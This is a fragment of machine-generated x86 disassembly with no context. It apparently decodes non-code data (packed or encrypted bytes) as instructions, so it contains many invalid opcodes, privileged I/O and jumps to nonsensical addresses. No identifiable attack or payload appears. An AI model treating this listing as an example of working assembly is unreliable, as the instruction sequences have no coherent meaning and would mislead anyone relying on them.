  41f117:	sub    eax,0x5583af42
  41f11c:	int    0x8
  41f11e:	jb     0x41f0cd
  41f120:	out    0xfa,eax
  41f122:	push   es
  41f123:	push   es
  41f124:	retf   
  41f125:	mov    ebx,0xe9fe93ac
  41f12a:	jmp    FWORD PTR [ebp+0x4e]
  41f12d:	mov    ah,0xe5
  41f12f:	loope  0x41f14c
  41f131:	mov    ds:0x4b616b48,al
  41f136:	pop    es
  41f137:	cmc    
  41f138:	or     eax,DWORD PTR [ebx]
  41f13a:	in     al,dx
  41f13b:	mov    al,0x2d
  41f13d:	dec    esi
  41f13e:	or     BYTE PTR [ecx+0x2180859f],dl
  41f144:	jle    0x41f12f
  41f146:	add    BYTE PTR [ebx],bh
  41f148:	test   BYTE PTR [ebx],dl
  41f14a:	in     al,0x22
  41f14c:	cs mov eax,0xd0164aea
  41f152:	cdq    
  41f153:	repz jnp 0x41f175
  41f156:	jnp    0x41f0e4
  41f158:	jl     0x41f1a9
  41f15a:	mov    al,0x4f
  41f15c:	inc    ebp
  41f15d:	test   ah,dh
  41f15f:	adc    ebp,edi
  41f161:	lock xor ah,BYTE PTR [edx-0x2a]
  41f165:	mov    cl,0x31
  41f167:	mov    esp,0xbdbda681
  41f16c:	repz les ecx,FWORD PTR [ecx+0x3a6b8b0b]
  41f173:	mov    ch,0xce
  41f175:	xor    al,0x45
  41f177:	pop    ds
  41f178:	xor    al,0x52
  41f17a:	push   esp
  41f17b:	add    al,0x1
  41f17d:	sbb    DWORD PTR [ebx+ebp*2-0x6f],esi
  41f181:	mov    ?,WORD PTR [edi]
  41f183:	lods   eax,DWORD PTR ds:[esi]
  41f184:	es retf 
  41f186:	dec    esi
  41f187:	mov    bl,0x9e
  41f189:	sahf   
  41f18a:	mov    dh,0x7f
  41f18c:	xor    edi,ebp
  41f18e:	scas   al,BYTE PTR es:[edi]
  41f18f:	outs   dx,DWORD PTR ds:[esi]
  41f190:	retf   
  41f191:	jno    0x41f184
  41f193:	stc    
  41f194:	xor    DWORD PTR ds:0x30c0ac5a,ecx
  41f19a:	pop    ebx
  41f19b:	in     eax,0x5e
  41f19d:	cld    
  41f19e:	retf   0x8b9
  41f1a1:	xchg   ebp,eax
  41f1a2:	mov    esp,esp
  41f1a4:	xor    DWORD PTR [edi-0x6dd91e17],0x24bb1d0b
  41f1ae:	xor    cl,ch
  41f1b0:	fst    st(5)
  41f1b2:	(bad)  
  41f1b3:	out    0x5b,eax
  41f1b5:	jmp    edx
  41f1b7:	hlt    
  41f1b8:	pop    ss
  41f1b9:	into   
  41f1ba:	sbb    al,0xc7
  41f1bc:	shl    bl,0xb1
  41f1bf:	inc    esi
  41f1c0:	pop    edx
  41f1c1:	dec    esi
  41f1c2:	push   cs
  41f1c3:	loope  0x41f18e
  41f1c5:	dec    eax
  41f1c6:	mov    esi,0xb29eb4d9
  41f1cb:	jne    0x41f14d
  41f1cd:	dec    eax
  41f1ce:	mov    al,ds:0x8c8c352
  41f1d3:	xor    ecx,DWORD PTR [ecx-0x764d6362]
  41f1d9:	fwait
  41f1da:	(bad)  
  41f1db:	xlat   BYTE PTR ds:[ebx]
  41f1dc:	adc    al,0x5b
  41f1de:	cmp    al,0x32
  41f1e0:	inc    esp
  41f1e1:	xchg   ecx,eax
  41f1e2:	mov    DWORD PTR [eax+0x3f],esi
  41f1e5:	jg     0x41f17a
  41f1e7:	sbb    al,0xc0
  41f1e9:	enter  0x4b56,0x19
  41f1ed:	mov    cl,0x4a
  41f1ef:	in     eax,dx
  41f1f0:	inc    esi
  41f1f1:	add    eax,0x9ca86fe1
  41f1f6:	or     eax,0xe6be4213
  41f1fb:	(bad)  [ecx+0x7df38766]
  41f201:	xor    DWORD PTR [esi],ebx
  41f203:	jbe    0x41f238
  41f205:	arpl   WORD PTR [edx+eax*4-0x3d],di
  41f209:	call   0xa836:0x4774a5f6
  41f210:	inc    ecx
  41f211:	(bad)  
  41f212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f213:	pop    esi
  41f214:	or     esp,DWORD PTR [edx]
  41f216:	ret    
  41f217:	jns    0x41f235
  41f219:	xchg   ebp,eax
  41f21a:	dec    edi
  41f21b:	xchg   esp,eax
  41f21c:	sub    eax,0xf6cd3f4
  41f221:	xchg   esp,eax
  41f222:	dec    DWORD PTR [edi]
  41f224:	xor    BYTE PTR [edi],ah
  41f226:	nop
  41f227:	and    ch,BYTE PTR ds:0xd08ec684
  41f22d:	push   es
  41f22e:	hlt    
  41f22f:	and    dl,BYTE PTR [edi]
  41f231:	mov    ebp,0xebf132c5
  41f236:	call   0x8b8d4c9f
  41f23b:	push   ss
  41f23c:	mov    ebp,0xb4be86fb
  41f241:	(bad)  
  41f242:	mov    cl,0xae
  41f244:	xchg   DWORD PTR [eax],edi
  41f246:	sbb    ah,BYTE PTR gs:[edi+0x6ea31b87]
  41f24d:	sbb    esi,esi
  41f24f:	xor    BYTE PTR [edx+0x39a79f95],0xee
  41f256:	and    eax,0xb00825b2
  41f25b:	ror    BYTE PTR [edx+ecx*2],0xf7
  41f25f:	aas    
  41f260:	lea    edx,[ecx-0x7b67ffd7]
  41f266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f267:	mov    cl,0xe
  41f269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f26a:	int3   
  41f26b:	add    al,0x4d
  41f26d:	xchg   DWORD PTR [edx],ebx
  41f26f:	inc    esi
  41f270:	mov    ds:0xb4a02580,al
  41f275:	and    ecx,DWORD PTR [eax+0x19]
  41f278:	mov    al,ds:0x12329ecc
  41f27d:	push   0xc0eeac2a
  41f282:	daa    
  41f283:	xchg   BYTE PTR [esi+0x24d03130],ch
  41f289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f28a:	ins    DWORD PTR es:[edi],dx
  41f28b:	je     0x41f2f7
  41f28d:	ror    BYTE PTR [edi+0x50],cl
  41f290:	xchg   ebx,eax
  41f291:	imul   edi,esp,0xffffffbc
  41f294:	sbb    ebx,DWORD PTR [ecx]
  41f296:	aad    0x2e
  41f298:	test   DWORD PTR [eax+0xc],edi
  41f29b:	push   ebx
  41f29c:	int    0x94
  41f29e:	cmp    eax,0x9097c39b
  41f2a3:	cmc    
  41f2a4:	shl    DWORD PTR [ebx-0x22af8125],1
  41f2aa:	push   ebp
  41f2ab:	(bad)  
  41f2ac:	mov    al,0xc2
  41f2ae:	mov    dh,0xf3
  41f2b0:	dec    esp
  41f2b1:	adc    al,0x18
  41f2b3:	mov    al,0xc5
  41f2b5:	cwde   
  41f2b6:	outs   dx,DWORD PTR ds:[esi]
  41f2b7:	mov    bh,0x6e
  41f2b9:	mov    edi,0x6611171b
  41f2be:	pushf  
  41f2bf:	mov    edi,0x4e6d4a57
  41f2c4:	ins    BYTE PTR es:[edi],dx
  41f2c5:	aad    0xe0
  41f2c7:	dec    esi
  41f2c8:	popa   
  41f2c9:	test   BYTE PTR [edx-0x53b34909],al
  41f2cf:	inc    ecx
  41f2d0:	inc    edi
  41f2d1:	inc    esp
  41f2d2:	mov    ecx,0xb298058f
  41f2d7:	sbb    ecx,ebp
  41f2d9:	call   0xcfaa8cf8
  41f2de:	fstp   QWORD PTR [edx]
  41f2e0:	cmp    al,0xd1
  41f2e2:	push   esp
  41f2e3:	push   ss
  41f2e4:	sbb    DWORD PTR [ebx-0x2a],ecx
  41f2e7:	push   eax
  41f2e8:	test   BYTE PTR [ecx+edi*2],bl
  41f2eb:	jecxz  0x41f2f8
  41f2ed:	cmc    
  41f2ee:	dec    edx
  41f2ef:	cmp    eax,0x6e7d04a0
  41f2f4:	push   ebp
  41f2f5:	or     ebx,0x56
  41f2f8:	outs   dx,BYTE PTR ds:[esi]
  41f2f9:	test   BYTE PTR [edx],ah
  41f2fb:	jno    0x41f31a
  41f2fd:	pop    ebp
  41f2fe:	adc    eax,0xd7cb186d
  41f303:	pop    eax
  41f304:	out    dx,al
  41f305:	push   ss
  41f306:	pusha  
  41f307:	mov    edx,0x166ce5f5
  41f30c:	scas   al,BYTE PTR es:[edi]
  41f30d:	sbb    bh,BYTE PTR [ebp-0x5b0a0c7]
  41f313:	int3   
  41f314:	leave  
  41f315:	div    dh
  41f317:	push   ss
  41f318:	xchg   esp,eax
  41f319:	jmp    FWORD PTR [ecx]
  41f31b:	int3   
  41f31c:	push   ecx
  41f31d:	add    al,0x3c
  41f31f:	mov    ?,WORD PTR [ebp+0x30033dce]
  41f325:	es add bl,ah
  41f328:	jmp    FWORD PTR [ecx+0x29]
  41f32b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f32c:	pop    edx
  41f32d:	add    edi,DWORD PTR [edi]
  41f32f:	imul   edx,DWORD PTR [ecx],0xf3e3e17f
  41f335:	fimul  WORD PTR ds:0x294ee228
  41f33b:	sbb    BYTE PTR [ecx-0x4a9f5f02],al
  41f341:	cs es (bad) 
  41f344:	data16 (bad) 
  41f346:	shl    BYTE PTR [ecx],1
  41f348:	sbb    bl,BYTE PTR [edx+0x22]
  41f34b:	icebp  
  41f34c:	sbb    DWORD PTR [ecx+esi*4],esi
  41f34f:	fcomp  DWORD PTR [ebp-0x7333ff44]
  41f355:	mov    bh,ch
  41f357:	out    0x90,al
  41f359:	mov    edi,0x44f85ccb
  41f35e:	aas    
  41f35f:	ds hlt 
  41f361:	xchg   ebp,eax
  41f362:	fwait
  41f363:	mov    eax,0x8bf87778
  41f368:	sbb    al,0x7c
  41f36a:	dec    esi
  41f36b:	out    dx,al
  41f36c:	sahf   
  41f36d:	pusha  
  41f36e:	data16 scas al,BYTE PTR es:[edi]
  41f370:	cdq    
  41f371:	(bad)  
  41f372:	adc    dh,BYTE PTR gs:[edx+0x53]
  41f376:	jb     0x41f3ad
  41f378:	fmul   DWORD PTR [esi+edi*4]
  41f37b:	add    bh,BYTE PTR [edi+eax*8-0x5813aa2a]
  41f382:	arpl   WORD PTR [esp+ecx*8-0x47d354d6],ax
  41f389:	mov    edx,0x35b60e1f
  41f38e:	lea    esi,[esp+ebp*1+0x282ceb6b]
  41f395:	add    eax,0x94fcf1e5
  41f39a:	into   
  41f39b:	arpl   WORD PTR [ecx-0x150367ff],dx
  41f3a1:	sbb    DWORD PTR [ecx-0x17f4f449],ebx
  41f3a7:	pusha  
  41f3a8:	scas   eax,DWORD PTR es:[edi]
  41f3a9:	aam    0xb1
  41f3ab:	fmul   DWORD PTR [edx]
  41f3ad:	cmp    DWORD PTR [ebx+eax*1+0x6d5907fc],esi
  41f3b4:	leave  
  41f3b5:	repnz adc al,BYTE PTR [edx-0x10]
  41f3b9:	pushf  
  41f3ba:	ss pop ds
  41f3bc:	dec    edi
  41f3bd:	sar    BYTE PTR [ebx+ecx*4+0x6b],1
  41f3c1:	and    BYTE PTR [ecx],ah
  41f3c3:	cmp    BYTE PTR [esi],dl
  41f3c5:	imul   edx,DWORD PTR [esi+0x1c],0x76573cf0
  41f3cc:	rcl    edi,1
  41f3ce:	(bad)  
  41f3cf:	inc    dh
  41f3d1:	sbb    DWORD PTR [eax+0x6a],edi
  41f3d4:	xchg   bh,al
  41f3d6:	mov    ebp,0xd18ad614
  41f3db:	jl     0x41f3ee
  41f3dd:	arpl   bp,bp
  41f3df:	mov    al,ds:0x9391f49c
  41f3e4:	mov    eax,ds:0xc4d2f0ba
  41f3e9:	and    dh,BYTE PTR [ebx+0x4b5a2ce1]
  41f3ef:	rol    DWORD PTR [ecx-0x1ca519a5],cl
  41f3f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3f6:	out    0x42,al
  41f3f8:	in     eax,dx
  41f3f9:	xor    bl,BYTE PTR [edx+0x59]
  41f3fc:	xchg   ebx,eax
  41f3fd:	pop    ecx
  41f3fe:	test   eax,0xfe696915
  41f403:	fdivr  st(6),st
  41f405:	call   0xccf2:0xee58ceb3
  41f40c:	mov    ecx,0x54651031
  41f411:	in     al,0x5e
  41f413:	mov    eax,0x46d23a9e
  41f418:	mov    bl,0x0
  41f41a:	ret    0x5385
  41f41d:	mov    ch,0x7f
  41f41f:	mov    ecx,DWORD PTR [esi-0x4d]
  41f422:	std    
  41f423:	adc    BYTE PTR [ecx],ah
  41f425:	add    BYTE PTR [eax+0x67de0a2f],0x7f
  41f42c:	xchg   DWORD PTR [esi-0x7b],ebx
  41f42f:	mov    edi,0x7fefb9d4
  41f434:	add    eax,0x398de88
  41f439:	jge    0x41f45d
  41f43b:	push   ebx
  41f43c:	in     eax,dx
  41f43d:	add    eax,0xc00ac589
  41f442:	inc    ecx
  41f443:	cs xor ch,ah
  41f446:	fstp   TBYTE PTR [esi-0x6d7c6bcf]
  41f44c:	jp     0x41f3f0
  41f44e:	jp     0x41f478
  41f450:	mov    ebp,0xc2b6d35a
  41f455:	sbb    al,ch
  41f457:	out    0xb1,al
  41f459:	in     eax,dx
  41f45a:	jne    0x41f4b7
  41f45c:	test   bl,bl
  41f45e:	dec    eax
  41f45f:	jle    0x41f4d2
  41f461:	outs   dx,BYTE PTR ds:[esi]
  41f462:	gs xchg edx,eax
  41f464:	xor    al,0x7c
  41f466:	mov    edi,0x336b7100
  41f46b:	mov    ecx,0x23db8819
  41f470:	leave  
  41f471:	jnp    0x41f4b1
  41f473:	jnp    0x41f4b9
  41f475:	xlat   BYTE PTR ds:[ebx]
  41f476:	das    
  41f477:	mov    edi,DWORD PTR [ebp+0x7f99dcc9]
  41f47d:	scas   al,BYTE PTR es:[edi]
  41f47e:	aas    
  41f47f:	mov    cl,0xcf
  41f481:	repz jg 0x41f407
  41f484:	inc    edi
  41f485:	retf   0x96bb
  41f488:	das    
  41f489:	and    al,0x75
  41f48b:	add    eax,0x22f4f653
  41f490:	mov    esp,0xf7f8f184
  41f495:	or     DWORD PTR [ecx+0x39496e0b],ebx
  41f49b:	jle    0x41f4dd
  41f49d:	call   0x9a711d76
  41f4a2:	lods   al,BYTE PTR ds:[esi]
  41f4a3:	inc    esi
  41f4a4:	mov    ecx,0xf5493e55
  41f4a9:	xor    al,0xdf
  41f4ab:	mov    esi,DWORD PTR [eax+0x26]
  41f4ae:	mov    dl,0x41
  41f4b0:	xor    eax,esi
  41f4b2:	(bad)  [esi+0x2ca688da]
  41f4b8:	loope  0x41f490
  41f4ba:	lds    eax,FWORD PTR [edi-0x4e130a9b]
  41f4c0:	stos   BYTE PTR es:[edi],al
  41f4c1:	lea    edx,[esi-0x7f]
  41f4c4:	dec    esp
  41f4c5:	xchg   ecx,eax
  41f4c6:	rcl    DWORD PTR [eax-0x23],cl
  41f4c9:	scas   al,BYTE PTR es:[edi]
  41f4ca:	mov    cl,0xf6
  41f4cc:	adc    esp,DWORD PTR [ebp-0x4c]
  41f4cf:	mov    ecx,0x48eb03ad
  41f4d4:	inc    esi
  41f4d5:	xchg   dx,ax
  41f4d7:	into   
  41f4d8:	fidivr WORD PTR [ecx]
  41f4da:	mov    ch,0x81
  41f4dc:	mov    edi,0x749c2ad4
  41f4e1:	ds push eax
  41f4e3:	iret   
  41f4e4:	inc    eax
  41f4e5:	xchg   DWORD PTR [edi],ebx
  41f4e7:	push   ds
  41f4e8:	xor    ch,bh
  41f4ea:	and    al,0x5
  41f4ec:	iret   
  41f4ed:	stos   DWORD PTR es:[edi],eax
  41f4ee:	in     eax,dx
  41f4ef:	fimul  WORD PTR [esi+0x7b]
  41f4f2:	test   DWORD PTR [ecx-0x10],ebp
  41f4f5:	push   es
  41f4f6:	mov    bh,0x0
  41f4f8:	or     DWORD PTR [edi+ebp*4],ebx
  41f4fb:	pop    ebx
  41f4fc:	test   al,0x73
  41f4fe:	ror    DWORD PTR [ecx+0x14],cl
  41f501:	and    bh,dh
  41f503:	call   0xf8f7:0x6bed8a2e
  41f50a:	loop   0x41f506
  41f50c:	(bad)  
  41f50d:	cmc    
  41f50e:	or     al,0xa4
  41f510:	mov    esi,DWORD PTR [esi+eiz*2+0x4c]
  41f514:	jb     0x41f4e2
  41f516:	pop    esi
  41f517:	dec    ebx
  41f518:	int3   
  41f519:	adc    eax,DWORD PTR ds:0x4e654b32
  41f51f:	xor    DWORD PTR [ebp-0x3],eax
  41f522:	push   eax
  41f523:	mov    ebp,0x935a6e19
  41f528:	dec    edx
  41f529:	mov    cl,0x8
  41f52b:	out    dx,eax
  41f52c:	arpl   WORD PTR [ebx+0x56],di
  41f52f:	outs   dx,DWORD PTR ds:[esi]
  41f530:	jne    0x41f4d6
  41f532:	shl    ebx,0x85
  41f535:	jge    0x41f57c
  41f537:	fstp   QWORD PTR [eax-0x65]
  41f53a:	getsec 
  41f53c:	lods   al,BYTE PTR ds:[esi]
  41f53d:	aad    0xfc
  41f53f:	mov    dl,0x9d
  41f541:	and    al,0xc7
  41f543:	add    al,0xa7
  41f545:	dec    ecx
  41f546:	or     ebx,DWORD PTR [ebp+0x76]
  41f549:	xchg   esp,eax
  41f54a:	data16 scas al,BYTE PTR es:[edi]
  41f54c:	sub    al,0x86
  41f54e:	adc    eax,0xce46d7f7
  41f553:	or     eax,0x81eb8944
  41f558:	aad    0xc8
  41f55a:	movntps XMMWORD PTR [esi+0x44],xmm7
  41f55e:	(bad)  
  41f55f:	push   edi
  41f560:	cmp    al,0x8
  41f562:	inc    esi
  41f563:	xor    BYTE PTR [ebp+edx*2-0x49],0x72
  41f568:	inc    ebx
  41f569:	(bad)  [ebx]
  41f56b:	dec    esi
  41f56c:	popf   
  41f56d:	xor    BYTE PTR [eax-0x115f0bb6],ah
  41f573:	mov    BYTE PTR [edx+0x1cfb73b3],cl
  41f579:	inc    ecx
  41f57a:	xchg   ecx,eax
  41f57b:	push   ss
  41f57c:	xor    ah,BYTE PTR [ecx+ebp*4]
  41f57f:	(bad)  
  41f580:	mov    esp,0x192f8c46
  41f585:	mov    ecx,0xee9bc5d1
  41f58a:	cmp    esi,ebx
  41f58c:	mov    dl,0xf
  41f58e:	aad    0xc6
  41f590:	pop    esi
  41f591:	or     BYTE PTR [esi],dl
  41f593:	fmul   DWORD PTR [esi]
  41f595:	inc    esp
  41f596:	mov    al,BYTE PTR [edi]
  41f598:	fld    QWORD PTR [edx-0xa]
  41f59b:	jae    0x41f616
  41f59d:	push   es
  41f59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f59f:	mov    cl,0x51
  41f5a1:	push   es
  41f5a2:	leave  
  41f5a3:	xchg   ebx,eax
  41f5a4:	das    
  41f5a5:	dec    edx
  41f5a6:	or     DWORD PTR [esi],esi
  41f5a8:	popf   
  41f5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5aa:	inc    esp
  41f5ab:	les    esi,FWORD PTR [eax+0x71]
  41f5ae:	bound  ebp,QWORD PTR [edx-0x77]
  41f5b1:	pop    edx
  41f5b2:	mov    al,0x57
  41f5b4:	mov    esp,0xf0de4a94
  41f5b9:	mov    ?,WORD PTR [edx]
  41f5bb:	retf   0x1ee6
  41f5be:	fisttp WORD PTR [ebp-0x2d764ca2]
  41f5c4:	mov    eax,ds:0x53a249a4
  41f5c9:	ret    
  41f5ca:	pop    es
  41f5cb:	outs   dx,BYTE PTR ds:[esi]
  41f5cc:	sbb    al,0x61
  41f5ce:	std    
  41f5cf:	jne    0x41f5fa
  41f5d1:	sub    bl,BYTE PTR [ecx-0x5d]
  41f5d4:	dec    ecx
  41f5d5:	inc    edi
  41f5d6:	hlt    
  41f5d7:	test   DWORD PTR [edi-0x6f],ecx
  41f5da:	push   cs
  41f5db:	push   ss
  41f5dc:	(bad)  
  41f5de:	(bad)
  41f5e3:	(bad)  
  41f5e4:	and    BYTE PTR [ecx+0x73],bh
  41f5e7:	pop    edi
  41f5e8:	push   ds
  41f5e9:	or     eax,0xe14ed77f
  41f5ee:	mov    ch,0x3a
  41f5f0:	mov    bl,0xcc
  41f5f2:	pusha  
  41f5f3:	add    esp,DWORD PTR [edx]
  41f5f5:	out    0x61,al
  41f5f7:	cmp    eax,0xf317d67
  41f5fc:	mov    bl,0x9b
  41f5fe:	fisub  DWORD PTR [edx-0x5f1323a3]
  41f604:	xchg   edi,eax
  41f605:	mov    ch,0x5a
  41f607:	fist   DWORD PTR [edx+0x1a]
  41f60a:	jecxz  0x41f642
  41f60c:	enter  0xda98,0x11
  41f610:	jns    0x41f66a
  41f612:	inc    esi
  41f613:	cs int3 
  41f615:	adc    BYTE PTR [ecx+0x25],0x7a
  41f619:	mov    dl,0xca
  41f61b:	out    dx,eax
  41f61c:	fcmovnu st,st(6)
  41f61e:	push   esi
  41f61f:	aad    0x28
  41f621:	add    al,BYTE PTR [esi-0x39]
  41f624:	inc    BYTE PTR [edx+0x4b]
  41f627:	ins    BYTE PTR es:[edi],dx
  41f628:	stc    
  41f629:	xchg   esp,eax
  41f62a:	cmp    ch,BYTE PTR [ecx]
  41f62c:	dec    edi
  41f62d:	inc    ebx
  41f62e:	scas   al,BYTE PTR es:[edi]
  41f62f:	adc    eax,0x56c533f5
  41f634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f635:	inc    ebp
  41f636:	jl     0x41f63a
  41f638:	test   DWORD PTR [ecx+0x0],eax
  41f63b:	ds aaa 
  41f63d:	pop    esi
  41f63e:	jne    0x41f651
  41f640:	mov    eax,ds:0x30894b1
  41f645:	(bad)  
  41f646:	repnz sti 
  41f648:	push   0xffffffaa
  41f64a:	sub    esp,esp
  41f64c:	hlt    
  41f64d:	adc    DWORD PTR [edx],esi
  41f64f:	xor    BYTE PTR [ecx+0x4177b3b8],bh
  41f655:	aaa    
  41f656:	ins    DWORD PTR es:[edi],dx
  41f657:	and    edx,DWORD PTR [ebp+0x7647ccdb]
  41f65d:	shl    bh,0x4c
  41f660:	leave  
  41f661:	sbb    BYTE PTR [ebp-0x3b],bl
  41f664:	jmp    0x41f669
  41f666:	rcl    DWORD PTR [esi-0x3f],0x16
  41f66a:	cmp    edx,DWORD PTR [edx+0x11]
  41f66d:	aas    
  41f66e:	dec    ebx
  41f66f:	ret    
  41f670:	test   DWORD PTR [ebp+0x58abfd9a],0x5a55d84d
  41f67a:	fwait
  41f67b:	test   eax,0xbd48b47b
  41f680:	retf   
  41f681:	test   eax,0xf28b7deb
  41f686:	hlt    
  41f687:	mov    eax,0x1d58a195
  41f68c:	pop    ss
  41f68d:	(bad)  
  41f690:	inc    edx
  41f691:	pop    esp
  41f692:	xor    eax,0x5587996b
  41f697:	(bad)  
  41f698:	std    
  41f699:	mov    cl,BYTE PTR [esi+ecx*8-0x39]
  41f69d:	inc    ebx
  41f69e:	sub    esp,DWORD PTR [edi+esi*2]
  41f6a1:	xchg   BYTE PTR [esi-0x6e3ff864],bh
  41f6a7:	ins    BYTE PTR es:[edi],dx
  41f6a8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41f6aa:	mov    edx,0x7f7c014
  41f6af:	pop    esp
  41f6b0:	xor    al,0x20
  41f6b2:	scas   al,BYTE PTR es:[edi]
  41f6b3:	or     bh,BYTE PTR [ecx-0x11e6ce1a]
  41f6b9:	(bad)  [ebx-0x12]
  41f6bc:	mul    BYTE PTR [edx]
  41f6be:	push   ebx
  41f6bf:	sub    DWORD PTR [eax+edi*2+0x59],ecx
  41f6c3:	jno    0x41f6ca
  41f6c5:	and    eax,0x67d7d556
  41f6ca:	cmp    esp,DWORD PTR [ebp-0x13]
  41f6cd:	std    
  41f6ce:	out    0x4b,eax
  41f6d0:	nop
  41f6d1:	sub    ecx,DWORD PTR [esp+edx*8+0x7c]
  41f6d5:	dec    esp
  41f6d6:	xchg   ah,dh
  41f6d8:	mov    esi,0x339169d
  41f6dd:	fwait
  41f6de:	push   edi
  41f6df:	fwait
  41f6e0:	popf   
  41f6e1:	out    0xc0,eax
  41f6e3:	adc    al,0x40
  41f6e5:	aad    0xc0
  41f6e7:	xchg   edx,eax
  41f6e8:	iret   
  41f6e9:	arpl   WORD PTR [edx],di
  41f6eb:	cld    
  41f6ec:	imul   eax,ebx,0x68
  41f6ef:	push   esp
  41f6f0:	test   BYTE PTR [edi+eax*1+0x79],cl
  41f6f4:	fsub   DWORD PTR [ebx]
  41f6f6:	xchg   edx,eax
  41f6f7:	sbb    eax,0xe78e9a2d
  41f6fc:	and    dh,BYTE PTR [edi]
  41f6fe:	xchg   ecx,eax
  41f6ff:	ret    
  41f700:	push   ebx
  41f701:	das    
  41f702:	push   esi
  41f703:	std    
  41f704:	cmc    
  41f705:	jl     0x41f6c9
  41f707:	inc    ecx
  41f708:	enter  0x54ea,0xd6
  41f70c:	ins    DWORD PTR es:[edi],dx
  41f70d:	mov    edx,0x6334b6df
  41f712:	pop    eax
  41f713:	(bad)  
  41f715:	ret    0xb0eb
  41f718:	push   esp
  41f719:	pop    eax
  41f71a:	test   al,0x14
  41f71c:	ficom  WORD PTR [eax]
  41f71e:	push   ebx
  41f71f:	push   ecx
  41f720:	add    eax,0x27b97200
  41f725:	sahf   
  41f726:	adc    DWORD PTR [ebx-0x763f101e],ebx
  41f72c:	mov    bl,BYTE PTR [ebp+0x72]
  41f72f:	enter  0x1d71,0x1a
  41f733:	bound  eax,QWORD PTR [edx+edi*4+0x1]
  41f737:	pop    esp
  41f738:	enter  0xfafd,0x94
  41f73c:	sti    
  41f73d:	aad    0x19
  41f73f:	push   ecx
  41f740:	inc    edi
  41f741:	and    dl,BYTE PTR [edi+0x65]
  41f744:	mov    WORD PTR [edx+0x1d],?
  41f747:	jg     0x41f75f
  41f749:	(bad)  
  41f74a:	push   ds
  41f74b:	add    esp,DWORD PTR es:[ecx-0x1d85a127]
  41f752:	dec    esp
  41f753:	ret    
  41f754:	inc    ebp
  41f755:	jecxz  0x41f7ca
  41f757:	mov    edi,0x1e49aa0a
  41f75c:	mov    bl,0x61
  41f75e:	push   ecx
  41f75f:	mov    ebx,0x223841d2
  41f764:	add    BYTE PTR [ecx-0x4b],bh
  41f767:	add    esp,DWORD PTR [edi+0x7d]
  41f76a:	xor    BYTE PTR [edi],bl
  41f76c:	pop    esi
  41f76d:	fs sub al,bh
  41f770:	daa    
  41f771:	call   0x5cbd:0xa95be0b2
  41f778:	xor    edi,edi
  41f77a:	mov    ah,dh
  41f77c:	sub    al,0x67
  41f77e:	pop    edi
  41f77f:	aas    
  41f780:	cld    
  41f781:	xchg   esp,eax
  41f782:	xchg   ebp,eax
  41f783:	hlt    
  41f784:	jecxz  0x41f7bc
  41f786:	or     eax,0xe339b123
  41f78b:	out    0x8e,al
  41f78d:	xchg   ebx,eax
  41f78e:	dec    ebx
  41f78f:	test   al,0x14
  41f791:	ror    DWORD PTR [edx+0x36],cl
  41f794:	mov    dh,0xb0
  41f796:	imul   esi,DWORD PTR [edx*1+0x6eedc938],0x4dd78bed
  41f7a1:	xor    eax,0xe8c89edb
  41f7a6:	inc    ebx
  41f7a7:	dec    ebp
  41f7a8:	jg     0x41f7dc
  41f7aa:	test   ebx,edi
  41f7ac:	lahf   
  41f7ad:	popf   
  41f7ae:	add    cl,BYTE PTR [eax]
  41f7b0:	js     0x41f7fb
  41f7b2:	adc    eax,0x5a6c7b8b
  41f7b7:	sbb    esi,DWORD PTR [esi+eiz*2-0x11]
  41f7bb:	jne    0x41f814
  41f7bd:	test   BYTE PTR [esp+ebp*8-0x7910181c],ah
  41f7c4:	test   cl,dh
  41f7c6:	sar    bl,0xf5
  41f7c9:	and    BYTE PTR [edi+0x57],ch
  41f7cc:	(bad)
  41f7d0:	std    
  41f7d1:	lea    ebp,[ebx]
  41f7d3:	popf   
  41f7d4:	pusha  
  41f7d5:	(bad)  
  41f7d6:	std    
  41f7d7:	inc    ecx
  41f7d8:	xor    eax,0x8fc97b3f
  41f7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7de:	sbb    eax,0x81b35761
  41f7e3:	dec    eax
  41f7e4:	jb     0x41f839
  41f7e6:	xchg   ebp,eax
  41f7e7:	xchg   edi,eax
  41f7e8:	xchg   ebx,eax
  41f7e9:	jb     0x41f867
  41f7eb:	mov    ebp,0x44999c8b
  41f7f0:	pop    ebp
  41f7f1:	(bad)  
  41f7f2:	cmp    BYTE PTR [ebx],bl
  41f7f4:	idiv   DWORD PTR cs:[esi-0x14]
  41f7f8:	call   DWORD PTR [esi+0x37]
  41f7fb:	jmp    DWORD PTR [eax+ecx*1-0x14d888cd]
  41f802:	mov    esp,0xadf95a66
  41f807:	dec    edi
  41f808:	cs out 0x1,eax
  41f80b:	inc    esi
  41f80c:	or     al,0xe5
  41f80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f80f:	sbb    ebp,DWORD PTR [esi-0x28]
  41f812:	xor    al,0x78
  41f814:	mov    esp,0x9b4311c3
  41f819:	push   cs
  41f81a:	imul   edi,DWORD PTR [esi],0xfffffff5
  41f81d:	mov    ch,0xe7
  41f81f:	outs   dx,DWORD PTR ds:[esi]
  41f820:	sbb    eax,0x84a1583f
  41f825:	mul    DWORD PTR [ebx]
  41f827:	adc    al,0x29
  41f829:	jg     0x41f872
  41f82b:	outs   dx,BYTE PTR ds:[esi]
  41f82c:	pop    ds
  41f82d:	cmp    cl,BYTE PTR [ebx]
  41f82f:	add    dh,ah
  41f831:	sub    bl,BYTE PTR [edx+0x1a]
  41f834:	inc    edi
  41f835:	jg     0x41f82a
  41f837:	jge    0x41f8ab
  41f839:	in     eax,dx
  41f83a:	push   edi
  41f83b:	adc    DWORD PTR [eax+esi*4],esi
  41f83e:	xchg   edx,eax
  41f83f:	ror    BYTE PTR [ecx-0x29a9c82d],1
  41f845:	mov    dl,0xdd
  41f847:	fidivr WORD PTR [ecx+0x7660c799]
  41f84d:	fcom   st(4)
  41f84f:	sbb    esp,DWORD PTR [esi-0x520774a]
